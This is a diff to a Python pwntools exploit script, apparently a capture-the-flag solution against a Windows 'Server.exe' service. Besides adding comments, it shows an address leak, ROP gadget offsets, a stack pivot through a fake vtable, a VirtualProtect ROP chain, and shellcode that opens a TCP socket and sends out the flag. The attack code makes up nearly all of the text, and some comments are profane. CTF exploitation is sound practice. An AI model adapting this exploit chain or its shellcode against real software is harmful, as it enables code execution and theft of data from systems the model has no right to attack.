@@ -48,10 +48,12 @@ for i in range(0, len(oob_data), 8):
 if base:
     print('Server.exe at %016x\n' % base)
 else:
-    print('No leak of server.exe')
+    print('No leak of Server.exe. Try again')
     exit(1)
 
 r.close()
+
+# these offsets are just based (haha based) off the main binary
 
 stack_pivot = base + 0xfda3 # leave ; mov rax, rcx ; ret
 topic = base + 0x2B6E8
@@ -70,6 +72,9 @@ add_rax_rcx = base + 0x9329
 flag = base + 0x2B2D0
 safe_stack_spot = base + 0x2BF80 # (somewhere safe we can put the stack MUST BE ALIGNED!!!!!)
 imp_send = base + 0x1C2D8
+
+# these offsets may vary from system-to-system
+
 virtualprotect_offset = 0x1B680  # rva of VirtualProtect in kernel32.dll
 connect_offset = 0x11600 # offset of connect in ws2_32.dll
 socket_offset = 0x5700 # offset of socket in ws2_32.dll
@@ -87,9 +92,9 @@ shellcode = asm(''
     + 'sub rax, 0x%x;' % send_offset
     + 'mov rbx, rax;'
 
-    + 'mov rcx, 2;'
-    + 'mov rdx, 1;'
-    + 'mov r8d, 6;'
+    + 'mov rcx, 2;' # AF_INET
+    + 'mov rdx, 1;' # SOCK_STREAM
+    + 'mov r8d, 6;' # IPPROTO_TCP
     + 'mov rax, rbx;' # call socket
     + 'add rax, 0x%016x ;' % socket_offset
     + 'call rax;'
@@ -125,7 +130,7 @@ topic_buf += p64(stack_pivot) # One gadget one shot fake vtable. Triggered by `j
 topic_buf += p64(stack_pivot) # One gadget one shot fake vtable. Triggered by `jmp rax`. We have controlled rcx and rbp (pointing to our overflown buffer area)
 topic_buf += p64(stack_pivot) # One gadget one shot fake vtable. Triggered by `jmp rax`. We have controlled rcx and rbp (pointing to our overflown buffer area)
 
-topic_buf += b'\x00'*16 # +0x20
+topic_buf += b'\x00'*16 # +0x20 # this padding does nothing, i just don't feel like changing the numbers around to get rid of it.
 
 topic_buf += p64(poprcx) # part two of ropchain. at topic_buf+0x30
 topic_buf += p64(virtualprotect_offset) # rva of VirtualProtect in kernel32.dll
@@ -143,7 +148,7 @@ topic_buf += shellcode # shellcode goes here!
 topic_buf += cyclic(1024-len(topic_buf))
 
 
-# load the topic
+# load the topic, dealing with nullbytes as necessary
 def load_topic():
     r = remote(REMOTE_HOST, 1337)
     r.recvuntil(b'connected\n')
@@ -194,7 +199,7 @@ while True:
     overflow_data += p64(0x6969696969696969) # asshole function fucks up four stack slots
     overflow_data += p64(0x6969696969696969) # asshole function fucks up four stack slots
     overflow_data += p64(0x6969696969696969) # asshole function fucks up four stack slots
-    overflow_data += p64(poprsp)  # no space, pivot to second chain
+    overflow_data += p64(poprsp)  # no more space, pivot to second chain
     overflow_data += p64(topic+48)
     overflow_data += p64(0x6969696969696969) # these slots are not reliable!!!
     overflow_data += p64(0x6969696969696969) # these slots are not reliable!!!
